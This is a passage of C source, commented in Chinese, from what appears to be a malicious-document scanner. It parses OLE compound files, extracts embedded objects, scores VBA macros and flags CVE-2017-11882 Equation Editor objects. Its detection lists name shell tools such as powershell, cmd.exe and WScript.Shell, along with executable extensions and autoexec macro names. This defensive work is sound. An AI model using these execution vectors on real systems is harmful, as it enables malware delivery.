        memcpy(result + off, &Ctx->Buf[sectorOffset], toRead);
        off += toRead;
        bytesRemaining -= toRead;
        currentSector = Ctx->Fat[currentSector];
        ++chainSteps;
    }

    *Out = result;
    *OutLen = (ULONG)off;
    return STATUS_SUCCESS;
}

/* Phase5: MiniFAT 链流读取 (MiniStream 容器内) */
static NTSTATUS
WkdDocCfb_ReadMiniChain(
    _In_ PWKD_CFB_CONTEXT Ctx,
    _In_ UINT32           StartSector,
    _In_ UINT64           StreamSize,
    _Out_ BYTE**          Out,
    _Out_ PULONG          OutLen
    )
{
    BYTE* result;
    UINT32 currentSector = StartSector;
    UINT64 bytesRemaining = StreamSize;
    ULONG chainSteps = 0;
    UINT64 off = 0;

    if (StreamSize == 0 || StartSector == 0xFFFFFFFE || StartSector == 0xFFFFFFFF) {
        *Out = NULL; *OutLen = 0; return STATUS_SUCCESS;
    }
    if (StreamSize > WKD_DOC_MAX_OLE_OBJECT) return STATUS_INVALID_PARAMETER;
    if (!Ctx->MiniStream || Ctx->MiniStreamSize == 0) {
        *Out = NULL; *OutLen = 0; return STATUS_SUCCESS;
    }

    result = (BYTE*)malloc((size_t)StreamSize);
    if (!result) return STATUS_NO_MEMORY;

    while (bytesRemaining > 0 &&
           currentSector != 0xFFFFFFFE && currentSector != 0xFFFFFFFF &&
           chainSteps < WKD_DOC_MAX_FAT_STEPS) {
        ULONG64 offset;
        ULONG toRead;
        if ((ULONG64)currentSector >= (ULONG64)Ctx->MiniFatCount) break;
        offset = (ULONG64)currentSector * Ctx->MiniSectorSize;
        if (offset >= Ctx->MiniStreamSize) break;
        toRead = (ULONG)(bytesRemaining < Ctx->MiniSectorSize ? bytesRemaining : Ctx->MiniSectorSize);
        if (offset + toRead > Ctx->MiniStreamSize) {
            toRead = (ULONG)(Ctx->MiniStreamSize - offset);
        }
        memcpy(result + off, &Ctx->MiniStream[offset], toRead);
        off += toRead;
        bytesRemaining -= toRead;
        currentSector = Ctx->MiniFat[currentSector];
        ++chainSteps;
    }

    *Out = result;
    *OutLen = (ULONG)off;
    return STATUS_SUCCESS;
}

/* 统一流读取: size<4096 走 MiniFAT, 否则 FAT 链 (对齐 SS L917-928) */
static NTSTATUS
WkdDocCfb_ReadStream(
    _In_ PWKD_CFB_CONTEXT Ctx,
    _In_ UINT32           StartSector,
    _In_ UINT64           StreamSize,
    _Out_ BYTE**          Out,
    _Out_ PULONG          OutLen
    )
{
    if (StreamSize == 0 || StartSector == 0xFFFFFFFE || StartSector == 0xFFFFFFFF) {
        *Out = NULL; *OutLen = 0; return STATUS_SUCCESS;
    }
    if (StreamSize < WKD_DOC_MINI_CUTOFF &&
        Ctx->MiniStream && Ctx->MiniStreamSize > 0 && Ctx->MiniFatCount > 0) {
        return WkdDocCfb_ReadMiniChain(Ctx, StartSector, StreamSize, Out, OutLen);
    }
    return WkdDocCfb_ReadFatChain(Ctx, StartSector, StreamSize, Out, OutLen);
}

/* 释放 CFB 上下文分配 */
static void
WkdDocCfb_Cleanup(
    _Inout_ PWKD_CFB_CONTEXT Ctx
    )
{
    if (Ctx->Fat) { free(Ctx->Fat); Ctx->Fat = NULL; }
    if (Ctx->MiniFat) { free(Ctx->MiniFat); Ctx->MiniFat = NULL; }
    if (Ctx->MiniStream) { free((BYTE*)Ctx->MiniStream); Ctx->MiniStream = NULL; }
    Ctx->MiniStreamSize = 0;
    Ctx->FatCount = 0;
    Ctx->MiniFatCount = 0;
}

/**************************************************/
/*               OLE 辅助                           */
/**************************************************/

/* CLSID → GUID 字符串 (对齐 SS FormatCLSIDString L2074-2092) */
static void
WkdDocFormatClsidString(
    _In_ const BYTE Clsid[16],
    _Out_ PCHAR     Buf,
    _In_ ULONG      BufSize
    )
{
    UINT32 d1 = (UINT32)Clsid[0] | ((UINT32)Clsid[1] << 8) |
                ((UINT32)Clsid[2] << 16) | ((UINT32)Clsid[3] << 24);
    UINT16 d2 = (UINT16)(Clsid[4] | (Clsid[5] << 8));
    UINT16 d3 = (UINT16)(Clsid[6] | (Clsid[7] << 8));

    if (BufSize < 40) { if (BufSize > 0) Buf[0] = '\0'; return; }
    sprintf_s(Buf, BufSize, "{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
              d1, d2, d3,
              Clsid[8], Clsid[9], Clsid[10], Clsid[11],
              Clsid[12], Clsid[13], Clsid[14], Clsid[15]);
}

static BOOLEAN
WkdDocIsClsidEmpty(
    _In_ const BYTE Clsid[16]
    )
{
    int i;
    for (i = 0; i < 16; i++) {
        if (Clsid[i] != 0) return FALSE;
    }
    return TRUE;
}

/* 匹配危险 CLSID 表 (对齐 SS MatchDangerousCLSID L2108-2116) */
static const WKD_OLE_CLSID_ENTRY*
WkdDocMatchDangerousClsid(
    _In_ const BYTE Clsid[16]
    )
{
    ULONG i;
    if (WkdDocIsClsidEmpty(Clsid)) return NULL;
    for (i = 0; i < WKD_DOC_NUM_OLE_CLSIDS; i++) {
        if (memcmp(Clsid, g_DangerousOleClsids[i].Bytes, 16) == 0) {
            return &g_DangerousOleClsids[i];
        }
    }
    return NULL;
}

/* 解析 \x01CompObj 流提取 ProgID (对齐 SS L2283-2313) */
static BOOLEAN
WkdDocParseProgIdFromCompObj(
    _In_ const BYTE* Data,
    _In_ ULONG       DataLen,
    _Out_ PCHAR      ProgId,
    _In_ ULONG       ProgIdSize
    )
{
    ULONG offset;
    UINT32 userTypeLen;
    UINT32 clipFmtLen;
    UINT32 progIdLen;

    if (ProgIdSize == 0) return FALSE;
    ProgId[0] = '\0';
    if (DataLen < 28) return FALSE;

    offset = 4 + 4 + 16; /* reserved + version + CLSID */
    if (offset + 4 > DataLen) return FALSE;
    userTypeLen = WkdDocReadLe32(&Data[offset]);
    offset += 4;
    if (userTypeLen > 0x10000 || offset + userTypeLen > DataLen) return FALSE;
    offset += userTypeLen;

    if (offset + 4 > DataLen) return FALSE;
    clipFmtLen = WkdDocReadLe32(&Data[offset]);
    offset += 4;
    if (clipFmtLen > 0x10000 || offset + clipFmtLen > DataLen) return FALSE;
    offset += clipFmtLen;

    if (offset + 4 > DataLen) return FALSE;
    progIdLen = WkdDocReadLe32(&Data[offset]);
    offset += 4;
    if (progIdLen == 0 || progIdLen > 256 || offset + progIdLen > DataLen) return FALSE;

    if (progIdLen >= ProgIdSize) progIdLen = ProgIdSize - 1;
    memcpy(ProgId, &Data[offset], progIdLen);
    ProgId[progIdLen] = '\0';
    return TRUE;
}

/* 解析 Package 流: 嵌入路径 + 载荷 (对齐 SS ParsePackageStream L2321-2370) */
static BOOLEAN
WkdDocParsePackageStream(
    _In_ const BYTE* Data,
    _In_ ULONG       DataLen,
    _Out_ PCHAR      EmbeddedPath,
    _In_ ULONG       PathSize,
    _Out_ const BYTE** Payload,
    _Out_ PULONG     PayloadLen
    )
{
    ULONG offset = 2;
    ULONG pathStart;

    *Payload = NULL;
    *PayloadLen = 0;
    if (EmbeddedPath && PathSize > 0) EmbeddedPath[0] = '\0';
    if (DataLen < 6) return FALSE;

    /* display name (null-terminated ANSI) */
    while (offset < DataLen && Data[offset] != 0) ++offset;
    if (offset >= DataLen) return FALSE;
    ++offset;

    /* icon filename (null-terminated ANSI) */
    while (offset < DataLen && Data[offset] != 0) ++offset;
    if (offset >= DataLen) return FALSE;
    ++offset;

    /* index (2) + type2 (2) */
    offset += 4;
    if (offset >= DataLen) return FALSE;

    /* embedded file path (null-terminated ANSI) */
    pathStart = offset;
    while (offset < DataLen && Data[offset] != 0) ++offset;
    if (offset > pathStart && EmbeddedPath && PathSize > 0) {
        ULONG pl = offset - pathStart;
        if (pl >= PathSize) pl = PathSize - 1;
        memcpy(EmbeddedPath, &Data[pathStart], pl);
        EmbeddedPath[pl] = '\0';
    }
    if (offset >= DataLen) return FALSE;
    ++offset;

    /* data length (4B LE) + payload */
    if (offset + 4 > DataLen) return FALSE;
    {
        UINT32 dataLen = WkdDocReadLe32(&Data[offset]);
        offset += 4;
        if (dataLen == 0 || dataLen > WKD_DOC_MAX_OLE_OBJECT) return FALSE;
        if (offset + dataLen > DataLen) return FALSE;
        *Payload = &Data[offset];
        *PayloadLen = dataLen;
    }
    return TRUE;
}

/* 嵌入内容可执行判定 (对齐 SS ContainsExecutableContent L2247-2276) */
static BOOLEAN
WkdDocContainsExecutableContent(
    _In_ const BYTE* Data,
    _In_ ULONG       DataLen
    )
{
    if (DataLen < 2) return FALSE;
    if (Data[0] == g_WkdDocPeMagic[0] && Data[1] == g_WkdDocPeMagic[1]) return TRUE;

    if (DataLen >= 4) {
        if (memcmp(Data, g_WkdDocElfMagic, 4) == 0) return TRUE;
        if (memcmp(Data, g_WkdDocZipMagic, 4) == 0) return TRUE;
        if (memcmp(Data, g_WkdDocCabMagic, 4) == 0) return TRUE;
        if (memcmp(Data, g_WkdDocRarMagic, 4) == 0) return TRUE;
    }

    /* 脚本 marker (前 512 字节) */
    if (DataLen >= 8) {
        ULONG headLen = (DataLen < 512) ? DataLen : 512;
        if (WkdDocFindStrNoCase(Data, headLen, "#!/")) return TRUE;
        if (WkdDocFindStrNoCase(Data, headLen, "powershell")) return TRUE;
        if (WkdDocFindStrNoCase(Data, headLen, "cmd.exe")) return TRUE;
        if (WkdDocFindStrNoCase(Data, headLen, "<script")) return TRUE;
        if (WkdDocFindStrNoCase(Data, headLen, "WScript.Shell")) return TRUE;
    }
    return FALSE;
}

/**************************************************/
/*               OLE 嵌入对象提取                   */
/*  对齐 SS ExtractOLEObjects L701-1122            */
/**************************************************/

static void
WkdDocExtractOleObjects(
    _In_ const BYTE* Buf,
    _In_ ULONG       Size,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    WKD_CFB_CONTEXT ctx;
    PWKD_CFB_DIR_ENTRY dirs = NULL;
    ULONG dirCount = 0;
    ULONG i;
    PCHAR progIds = NULL;

    memset(&ctx, 0, sizeof(ctx));
    ctx.Buf = Buf;
    ctx.BufSize = Size;

    if (!NT_SUCCESS(WkdDocCfb_ParseHeader(Buf, Size, &ctx))) return;
    if (!NT_SUCCESS(WkdDocCfb_BuildFat(&ctx))) goto cleanup;
    if (!NT_SUCCESS(WkdDocCfb_BuildMiniFat(&ctx))) goto cleanup;
    if (!NT_SUCCESS(WkdDocCfb_ParseDirectory(&ctx, &dirs, &dirCount))) goto cleanup;
    if (dirCount == 0) goto cleanup;

    /* 第一遍: 提取 CompObj ProgID (对齐 SS L942-960) */
    progIds = (PCHAR)malloc((size_t)dirCount * 64);
    if (progIds) {
        memset(progIds, 0, (size_t)dirCount * 64);
        for (i = 0; i < dirCount; i++) {
            const WKD_CFB_DIR_ENTRY* de = &dirs[i];
            if (de->ObjectType != 2) continue;
            if (strlen(de->Name) >= 8 && (BYTE)de->Name[0] == 0x01 &&
                strcmp(de->Name + 1, "CompObj") == 0) {
                BYTE* compData = NULL;
                ULONG compLen = 0;
                if (NT_SUCCESS(WkdDocCfb_ReadStream(&ctx, de->StartSector, de->StreamSize,
                                                    &compData, &compLen)) && compData) {
                    WkdDocParseProgIdFromCompObj(compData, compLen,
                                                 progIds + (size_t)i * 64, 64);
                    free(compData);
                }
            }
        }
    }

    for (i = 0; i < dirCount && R->OleObjectCount < WKD_DOC_MAX_OLE; i++) {
        const WKD_CFB_DIR_ENTRY* de = &dirs[i];
        const WKD_OLE_CLSID_ENTRY* clsidMatch;
        BOOLEAN hasClsid;
        BOOLEAN isNamedPackage;
        BOOLEAN isObjectPool;
        BOOLEAN isOleMarker;
        BOOLEAN isOleObject;
        BOOLEAN hasContents = FALSE;
        PWKD_DOC_OLE_OBJECT obj = NULL;

        if (de->ObjectType == 0 || de->ObjectType == 5) continue; /* empty/root */

        clsidMatch = WkdDocMatchDangerousClsid(de->Clsid);
        hasClsid = !WkdDocIsClsidEmpty(de->Clsid);
        isNamedPackage = (strcmp(de->Name, "Package") == 0);
        isObjectPool = (strstr(de->Name, "ObjectPool") != NULL);
        isOleMarker = (strncmp(de->Name, "\x01Ole", 4) == 0);

        isOleObject = (clsidMatch != NULL) ||
                      (de->ObjectType == 1 && hasClsid) ||
                      isNamedPackage ||
                      isObjectPool;

        if (!isOleObject && !isOleMarker) continue;
        if (isOleMarker && !isOleObject) continue;

        obj = &R->OleObjects[R->OleObjectCount];
        memset(obj, 0, sizeof(*obj));
        strncpy_s(obj->DisplayName, sizeof(obj->DisplayName), de->Name, _TRUNCATE);
        obj->Size = de->StreamSize;
        WkdDocFormatClsidString(de->Clsid, obj->Clsid, sizeof(obj->Clsid));

        if (clsidMatch) {
            strncpy_s(obj->ProgId, sizeof(obj->ProgId), clsidMatch->ProgId, _TRUNCATE);
            obj->IsExecutable = clsidMatch->IsExecutable;
            obj->IsPackage = clsidMatch->IsPackage;
            obj->HasAutoStart = clsidMatch->HasAutoStart;
        } else if (hasClsid && progIds && progIds[(size_t)i * 64] != '\0') {
            /* 未知 CLSID: CompObj ProgID 填充 (对齐 SS L999-1005) */
            strncpy_s(obj->ProgId, sizeof(obj->ProgId), progIds + (size_t)i * 64, _TRUNCATE);
        }
        if (isNamedPackage) {
            obj->IsPackage = TRUE;
            obj->IsExecutable = TRUE; /* Package 可嵌入任意可执行 */
        }

        /* 流数据提取 + 深度检查 (对齐 SS L1015-1064) */
        if (de->ObjectType == 2 && de->StreamSize > 0 &&
            de->StreamSize <= WKD_DOC_MAX_OLE_OBJECT) {
            BYTE* streamData = NULL;
            ULONG streamLen = 0;

            if (NT_SUCCESS(WkdDocCfb_ReadStream(&ctx, de->StartSector, de->StreamSize,
                                                &streamData, &streamLen)) && streamData) {
                if (isNamedPackage && streamLen >= 6) {
                    CHAR embPath[260];
                    const BYTE* payload = NULL;
                    ULONG payloadLen = 0;
                    if (WkdDocParsePackageStream(streamData, streamLen, embPath, sizeof(embPath),
                                                 &payload, &payloadLen)) {
                        PCSTR ext;
                        if (embPath[0]) {
                            strncpy_s(obj->EmbeddedPath, sizeof(obj->EmbeddedPath), embPath, _TRUNCATE);
                            ext = strrchr(embPath, '.');
                            if (ext && (_stricmp(ext, ".exe") == 0 || _stricmp(ext, ".dll") == 0 ||
                                        _stricmp(ext, ".scr") == 0 || _stricmp(ext, ".bat") == 0 ||
                                        _stricmp(ext, ".cmd") == 0 || _stricmp(ext, ".ps1") == 0 ||
                                        _stricmp(ext, ".vbs") == 0 || _stricmp(ext, ".js") == 0 ||
                                        _stricmp(ext, ".hta") == 0 || _stricmp(ext, ".wsf") == 0 ||
                                        _stricmp(ext, ".com") == 0 || _stricmp(ext, ".pif") == 0 ||
                                        _stricmp(ext, ".msi") == 0 || _stricmp(ext, ".lnk") == 0)) {
                                obj->IsExecutable = TRUE;
                                obj->HasAutoStart = TRUE;
                            }
                        }
                        if (payload && payloadLen > 0) {
                            if (WkdDocContainsExecutableContent(payload, payloadLen)) {
                                obj->IsExecutable = TRUE;
                            }
                            WkdDocComputeBufferSha256(payload, payloadLen, obj->Sha256Hex,
                                                      sizeof(obj->Sha256Hex));
                            obj->Size = payloadLen;
                        }
                    }
                } else {
                    if (WkdDocContainsExecutableContent(streamData, streamLen)) {
                        obj->IsExecutable = TRUE;
                    }
                    WkdDocComputeBufferSha256(streamData, streamLen, obj->Sha256Hex,
                                              sizeof(obj->Sha256Hex));
                }
                free(streamData);
            }
        }

        /* storage 子流扫描: Contents/Package/Ole10Native (对齐 SS L1066-1101) */
        if (de->ObjectType == 1) {
            ULONG ci;
            for (ci = 0; ci < dirCount && !hasContents; ci++) {
                const WKD_CFB_DIR_ENTRY* child = &dirs[ci];
                BOOLEAN isContents;
                BOOLEAN isChildPackage;
                BOOLEAN isEmbedding;
                BYTE* childData = NULL;
                ULONG childLen = 0;

                if (child->ObjectType != 2) continue;
                if (child->StreamSize == 0 || child->StreamSize > WKD_DOC_MAX_OLE_OBJECT) continue;

                isContents = (strcmp(child->Name, "Contents") == 0 ||
                              strcmp(child->Name, "CONTENTS") == 0);
                isChildPackage = (strcmp(child->Name, "Package") == 0);
                isEmbedding = (strncmp(child->Name, "\x01Ole10Native", 12) == 0 ||
                               strncmp(child->Name, "\x01Ole10Nativ", 12) == 0);

                if (!isContents && !isChildPackage && !isEmbedding) continue;

                if (!NT_SUCCESS(WkdDocCfb_ReadStream(&ctx, child->StartSector, child->StreamSize,
                                                     &childData, &childLen)) || !childData) {
                    continue;
                }
                if (WkdDocContainsExecutableContent(childData, childLen)) {
                    obj->IsExecutable = TRUE;
                }
                if (obj->Sha256Hex[0] == '\0') {
                    WkdDocComputeBufferSha256(childData, childLen, obj->Sha256Hex,
                                              sizeof(obj->Sha256Hex));
                    obj->Size = childLen;
                }
                free(childData);
                hasContents = TRUE;
            }
        }

        /* CVE 关联: Equation 对象 (对齐 SS L1103-1109) */
        if (strstr(obj->ProgId, "Equation.3") || strstr(obj->ProgId, "Equation.2")) {
            strcat_s(obj->ProgId, sizeof(obj->ProgId), " [CVE-2017-11882]");
            WkdDocAddThreat(R, WkdDocThreat_EquationEditor, 90,
                            "Equation Editor object (CVE-2017-11882)", "OLE",
                            "T1203", obj->ProgId);
        }

        R->OleObjectCount++;
    }

cleanup:
    if (progIds) free(progIds);
    if (dirs) free(dirs);
    WkdDocCfb_Cleanup(&ctx);
}

/* OLE 流枚举 (死代码, 对齐 SS ListOLEStreamsInternal L2372-2467) */
static void
WkdDocListOleStreams(
    _In_ const BYTE* Buf,
    _In_ ULONG       Size,
    _Out_ PCHAR      Streams,
    _In_ ULONG       StreamsSize
    )
{
    WKD_CFB_CONTEXT ctx;
    PWKD_CFB_DIR_ENTRY dirs = NULL;
    ULONG dirCount = 0;
    ULONG i;
    ULONG off = 0;

    memset(&ctx, 0, sizeof(ctx));
    ctx.Buf = Buf;
    ctx.BufSize = Size;

    if (!Streams || StreamsSize == 0) return;
    Streams[0] = '\0';
    if (!NT_SUCCESS(WkdDocCfb_ParseHeader(Buf, Size, &ctx))) return;
    if (!NT_SUCCESS(WkdDocCfb_BuildFat(&ctx))) goto cleanup;
    if (!NT_SUCCESS(WkdDocCfb_ParseDirectory(&ctx, &dirs, &dirCount))) goto cleanup;

    for (i = 0; i < dirCount; i++) {
        ULONG need;
        if (dirs[i].ObjectType == 0) continue;
        need = (ULONG)strlen(dirs[i].Name) + 2;
        if (off + need >= StreamsSize) break;
        sprintf_s(&Streams[off], StreamsSize - off, "%s;", dirs[i].Name);
        off += need - 1;
    }

cleanup:
    if (dirs) free(dirs);
    WkdDocCfb_Cleanup(&ctx);
}

/**************************************************/
/*               OLE 特征扫描 (兜底)               */
/**************************************************/

static void
WkdDocScanOle(
    _In_ const BYTE* Buf,
    _In_ SIZE_T      Len,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    static const char* vbaMarkers[] = {
        "Attribute VB_Name",
        "Document_Open",
        "Workbook_Open",
        "Auto_Open",
        "ThisWorkbook",
    };
    ULONG i;
    BOOLEAN hasVba = FALSE;

    if (R->HasMacros) return; /* CFB 已提取宏, 不重复 */
    for (i = 0; i < (ULONG)(sizeof(vbaMarkers) / sizeof(vbaMarkers[0])); i++) {
        if (WkdDocFindStrNoCase(Buf, Len, vbaMarkers[i])) { hasVba = TRUE; break; }
    }
    if (hasVba) {
        R->HasMacros = TRUE;
        R->MacroCount = 1;
        WkdDocAddThreat(R, WkdDocThreat_VBAMacro, 40,
                        "OLE document with VBA indicators", "OLE", "T1059.005", NULL);
    }
}

/**************************************************/
/*               VBA 宏源码分析                     */
/*  对齐 SS AnalyzeMacroCode L1982-2064            */
/**************************************************/

static void
WkdDocAnalyzeMacroCode(
    _In_ PCSTR                   Code,
    _Inout_ PWKD_DOC_MACRO       Macro,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    CHAR lower[WKD_DOC_VBA_MAX_CODE + 1];
    ULONG codeLen;
    ULONG i;
    ULONG riskScore = 0;
    CHAR urls[WKD_DOC_MAX_IOC][256];
    ULONG urlCount = 0;
    CHAR ips[WKD_DOC_MAX_IOC][64];
    ULONG ipCount = 0;

    if (!Code || !Macro) return;
    codeLen = (ULONG)strlen(Code);
    if (codeLen == 0) return;
    if (codeLen > WKD_DOC_VBA_MAX_CODE) codeLen = WKD_DOC_VBA_MAX_CODE;

    /* 熵 → 混淆 */
    Macro->Entropy = WkdDocEntropy((const BYTE*)Code, codeLen);
    if (Macro->Entropy > 6.5) Macro->IsObfuscated = TRUE;

    /* 小写拷贝用于大小写不敏感匹配 */
    WkdDocToLower(Code, lower, sizeof(lower));

    /* AutoExec 检测 */
    for (i = 0; i < (ULONG)(sizeof(g_VbaAutoExec) / sizeof(g_VbaAutoExec[0])); i++) {
        if (strstr(lower, g_VbaAutoExec[i])) { Macro->IsAutoExec = TRUE; break; }
    }

    /* 可疑 API */
    for (i = 0; i < (ULONG)(sizeof(g_SuspiciousVbaApis) / sizeof(g_SuspiciousVbaApis[0])); i++) {
        if (strstr(lower, g_SuspiciousVbaApis[i])) {
            const char* api = g_SuspiciousVbaApis[i];
            if (strstr(api, "Shell") || strstr(api, "Exec") || strstr(api, "WinExec")) {
                Macro->HasShellExec = TRUE;
            }
            if (strstr(api, "PowerShell")) Macro->HasPowerShell = TRUE;
            if (strstr(api, "Download") || strstr(api, "XMLHTTP")) Macro->HasDownload = TRUE;
            if (strstr(api, "SaveAs") || strstr(api, "WriteText")) Macro->HasFileWrite = TRUE;
            if (strstr(api, "Reg")) Macro->HasRegistryAccess = TRUE;
            if (strstr(api, "WMI") || strstr(api, "Win32_")) Macro->HasWMI = TRUE;
        }
    }

    /* IOC 提取 */
    WkdDocExtractUrls((const BYTE*)Code, codeLen, WKD_DOC_MAX_IOC, urls, &urlCount);
    WkdDocExtractIps((const BYTE*)Code, codeLen, WKD_DOC_MAX_IOC, ips, &ipCount);
    {
        ULONG c;
        for (c = 0; c < urlCount && R->UrlCount < WKD_DOC_MAX_IOC; c++) {
            strncpy_s(R->Urls[R->UrlCount], 256, urls[c], _TRUNCATE);
            R->UrlCount++;
        }
        for (c = 0; c < ipCount && R->IpCount < WKD_DOC_MAX_IOC; c++) {
            strncpy_s(R->Ips[R->IpCount], 64, ips[c], _TRUNCATE);
            R->IpCount++;
        }
    }

    /* 风险评分 (对齐 SS L2046-2059) */
    if (Macro->IsAutoExec)   riskScore += 20;
    if (Macro->IsObfuscated) riskScore += 25;
    if (Macro->HasShellExec) riskScore += 30;
    if (Macro->HasPowerShell) riskScore += 25;
    if (Macro->HasDownload)  riskScore += 20;
    if (Macro->HasWMI)       riskScore += 15;
    if (urlCount > 0)        riskScore += 20;

    if (riskScore >= 80)      Macro->RiskLevel = 4; /* Critical */
    else if (riskScore >= 60) Macro->RiskLevel = 3; /* High */
    else if (riskScore >= 30) Macro->RiskLevel = 2; /* Medium */
    else if (riskScore > 0)   Macro->RiskLevel = 1; /* Low */

    /* 威胁 (对齐 SS L1542-1562 / L1624-1644) */
    if (Macro->RiskLevel >= 3) {
        WkdDocAddThreat(R,
            Macro->IsAutoExec ? WkdDocThreat_AutoExecMacro : WkdDocThreat_VBAMacro,
            (ULONG)Macro->RiskLevel * 25,
            Macro->IsAutoExec ? "Suspicious auto-exec macro" : "Suspicious VBA macro",
            "VBA", "T1059.005", Macro->ModuleName);
    }
}

/* 宏源码提取共用: 从二进制 buffer 扫 Attribute VB_Name (对齐 SS L1825-1886) */
static ULONG
WkdDocExtractMacrosFromBuffer(
    _In_  const BYTE* Buf,
    _In_  ULONG       BufLen,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    static const char vbNameMarker[] = "Attribute VB_Name = \"";
    ULONG searchPos = 0;
    ULONG count = 0;
    const BYTE* content = Buf;

    while (searchPos + sizeof(vbNameMarker) - 1 <= BufLen && count < WKD_DOC_MAX_MACROS) {
        const BYTE* hit = WkdDocFindStrNoCase(content + searchPos, BufLen - searchPos, vbNameMarker);
        ULONG nameStart;
        ULONG nameEnd;
        ULONG codeStart;
        ULONG codeEnd;
        PWKD_DOC_MACRO macro;

        if (!hit) break;
        searchPos = (ULONG)(hit - content) + (ULONG)(sizeof(vbNameMarker) - 1);
        if (searchPos >= BufLen) break;

        /* 模块名: 到下一个 " */
        nameStart = searchPos;
        nameEnd = nameStart;
        while (nameEnd < BufLen && nameEnd - nameStart < 256 && Buf[nameEnd] != '"') nameEnd++;
        if (nameEnd >= BufLen || nameEnd - nameStart > 256) break;

        macro = &R->Macros[R->MacroCount];
        memset(macro, 0, sizeof(*macro));
        if (nameEnd - nameStart < sizeof(macro->ModuleName)) {
            memcpy(macro->ModuleName, &Buf[nameStart], nameEnd - nameStart);
            macro->ModuleName[nameEnd - nameStart] = '\0';
        }
        strcpy_s(macro->ModuleType, sizeof(macro->ModuleType), "Module");

        /* 源码块: 到下一个 marker 或 100KB */
        codeStart = searchPos;
        codeEnd = codeStart;
        {
            const BYTE* next = WkdDocFindStrNoCase(content + codeStart, BufLen - codeStart, vbNameMarker);
            if (next) {
                ULONG off = (ULONG)(next - content);
                codeEnd = (off < codeStart + WKD_DOC_VBA_MAX_CODE) ? off : codeStart + WKD_DOC_VBA_MAX_CODE;
            } else {
                codeEnd = codeStart + WKD_DOC_VBA_MAX_CODE;
            }
            if (codeEnd > BufLen) codeEnd = BufLen;
        }

        /* 过滤非可打印字符 → 可读源码 */
        {
            ULONG si = codeStart;
            ULONG di = 0;
            CHAR src[WKD_DOC_VBA_MAX_CODE + 1];
            while (si < codeEnd && di < sizeof(src) - 1) {
                CHAR c = (CHAR)Buf[si++];
                if ((c >= 0x20 && c <= 0x7E) || c == '\n' || c == '\r' || c == '\t') {
                    src[di++] = c;
                }
            }
            src[di] = '\0';
            strncpy_s(macro->SourceCode, sizeof(macro->SourceCode), src, _TRUNCATE);
            macro->LineCount = 0;
            {
                ULONG l;
                for (l = 0; l < di; l++) if (src[l] == '\n') macro->LineCount++;
            }
            macro->LineCount++;
        }

        WkdDocAnalyzeMacroCode(macro->SourceCode, macro, R);
        R->MacroCount++;
        count++;

        searchPos = nameEnd + 1;
    }

    R->HasMacros = (R->MacroCount > 0);
    return R->MacroCount;
}

NTSTATUS
IocDocument_AnalyzeVBACode(
    _In_ PCSTR              VbaCode,
    _Out_ PWKD_DOC_SCAN_RESULT Result
    )
{
    PWKD_DOC_MACRO macro;

    if (!VbaCode || !Result) return STATUS_INVALID_PARAMETER;
    RtlZeroMemory(Result, sizeof(*Result));

    if (VbaCode[0] == '\0') return STATUS_SUCCESS;

    macro = &Result->Macros[0];
    memset(macro, 0, sizeof(*macro));
    strcpy_s(macro->ModuleType, sizeof(macro->ModuleType), "Module");
    strncpy_s(macro->SourceCode, sizeof(macro->SourceCode), VbaCode, _TRUNCATE);
    {
        ULONG l;
        macro->LineCount = 1;
        for (l = 0; VbaCode[l]; l++) if (VbaCode[l] == '\n') macro->LineCount++;
    }

    WkdDocAnalyzeMacroCode(macro->SourceCode, macro, Result);

    Result->HasMacros = TRUE;
    Result->MacroCount = 1;
    Result->HighestMacroRisk = macro->RiskLevel;
    Result->IsObfuscated = macro->IsObfuscated;

    if (macro->RiskLevel > 0) {
        Result->RiskScore = (macro->RiskLevel >= 3) ? 60 : 35;
    }
    if (macro->RiskLevel >= 4) Result->RiskScore = 80;

    /* 判定 (对齐 SS CalculateVerdict 宏路径) */
    if (Result->CriticalThreats > 0 || Result->RiskScore >= 80) {
        Result->Verdict = 3;
        strcpy_s(Result->VerdictReason, sizeof(Result->VerdictReason), "Critical macro threats");
    } else if (Result->HighThreats > 0 || Result->RiskScore >= 60) {
        Result->Verdict = 2;
        strcpy_s(Result->VerdictReason, sizeof(Result->VerdictReason), "High-risk macro threats");
    } else if (Result->RiskScore >= 30) {
        Result->Verdict = 1;
        strcpy_s(Result->VerdictReason, sizeof(Result->VerdictReason), "Suspicious macro patterns");
    } else {
        Result->Verdict = 0;
        strcpy_s(Result->VerdictReason, sizeof(Result->VerdictReason), "No macro threats");
    }

    return STATUS_SUCCESS;
}

/**************************************************/
/*               宏去混淆                          */
/*  对齐 SS DeobfuscateMacro L643-695 (死代码)     */
/**************************************************/

static void
WkdDocDeobfuscateMacro(
    _In_ PCSTR  ObfuscatedCode,
    _Out_ PCHAR Out,
    _In_ ULONG  OutSize
    )
{
    ULONG len;
    ULONG i;
    ULONG di = 0;
    PSTR expanded;

    if (!ObfuscatedCode || !Out || OutSize == 0) return;
    Out[0] = '\0';
    len = (ULONG)strlen(ObfuscatedCode);
    if (len == 0) return;

    expanded = (PSTR)malloc(len + 1);
    if (!expanded) return;

    /* 1. Chr() 拼接展开: Chr(72)&Chr(101) -> "He" */
    {
        ULONG pos = 0;
        ULONG eo = 0;
        while (pos < len && eo < len) {
            if (pos + 4 < len && strncmp(&ObfuscatedCode[pos], "Chr(", 4) == 0) {
                ULONG numStart = pos + 4;
                ULONG numEnd = numStart;
                while (numEnd < len && numEnd - numStart <= 3 && ObfuscatedCode[numEnd] != ')') numEnd++;
                if (numEnd < len && numEnd - numStart <= 3 && numEnd - numStart > 0) {
                    int val = 0;
                    ULONG k;
                    for (k = numStart; k < numEnd; k++) {
                        if (ObfuscatedCode[k] < '0' || ObfuscatedCode[k] > '9') break;
                        val = val * 10 + (ObfuscatedCode[k] - '0');
                    }
                    if (k == numEnd && val >= 0 && val <= 127) {
                        expanded[eo++] = (CHAR)val;
                        pos = numEnd + 1;
                        while (pos < len && (ObfuscatedCode[pos] == '&' || ObfuscatedCode[pos] == ' ')) pos++;
                        continue;
                    }
                }
            }
            expanded[eo++] = ObfuscatedCode[pos++];
        }
        expanded[eo] = '\0';
        len = eo;
    }

    /* 2. 移除行续接: ' ' + '_' + newline */
    for (i = 0; i < len && di + 1 < OutSize; i++) {
        if (expanded[i] == ' ' && i + 1 < len && expanded[i + 1] == '_') {
            ULONG j = i + 2;
